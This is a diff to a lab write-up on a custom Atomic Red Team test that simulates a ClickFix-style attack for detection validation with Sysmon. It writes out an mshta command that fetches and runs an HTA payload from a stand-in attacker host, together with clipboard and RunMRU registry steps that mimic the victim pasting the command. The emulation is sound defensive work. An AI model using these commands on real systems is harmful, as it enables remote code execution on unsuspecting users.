@@ -158,5 +158,33 @@ AutoHotkey was used to simulate automated clipboard injection as part of the Cli
   
    ![Compile .ahk to .exe](images/compile-ahk.png)
      
-#### :five: **Custom Atomic Red Team script**  
-I created a custom test in Atomic Red Team to simulate the HTA ClickFix-style attack chain, ensuring the test executes according to the intended behavior.   
+#### :five: **Custom Atomic Red Team Script**  
+To accurately replicate the HTA-based ClickFix execution flow, I created a custom Atomic Red Team test under **T1204.002 (User Execution - Malicious File)**.  
+  
+Rather than building a separate script outside the framework, I modified the existing `T1204.002.yaml` file within the `atomics` and added a custom test to execute the HTA payload.  
+  
+![Custom Atomic Red Team Script](images/custom-atomic-script.png)  
+
+**What this script does?**  
+This Atomic Red Team test simulates a ClickFix-style attack chain in 4 main steps:  
+1. **Create a malicious command**  
+   `mshta.exe http://attacker-ip:8000/clickfix.hta`
+   This command downloads the payload and executes it on the target system.  
+3. **Copy the command to the clipboard**  
+   `$cmd | clip`  
+   This simulate the user copying a malicious command and is expected to generate a clipboard change event.  
+4. **Modify RunMRU (simulate Win + R)**  
+   `Set-ItemProperty -Path RunMRU -Name "MRU" -Value $cmd`  
+   This simulates execution through the Windows Run dialog and generates a registry modification event.  
+5. **Execute the attack**  
+   `Start-Process clickfix-clipboard.exe`
+   This launches the AutoHotkey automation, which opens the Run dialog, pastes the clipboard content, and executes the command.
+    
+The Cleanup section will clean everything after the test.  
+> **Note:** Cleanup does not run automatically. It must be executed manually using the `Invoke-AtomiicTest` flag.
+`Invoke-AtomicTest T1204.002 -Cleanup`  
+  
+#### :six: **Sysmon Configuration**  
+Before executing the test, the Sysmon configuration was updated to ensure all relevant events is captured. This ensures full visibility of the simulated attack chain for detection validation.  
+
+
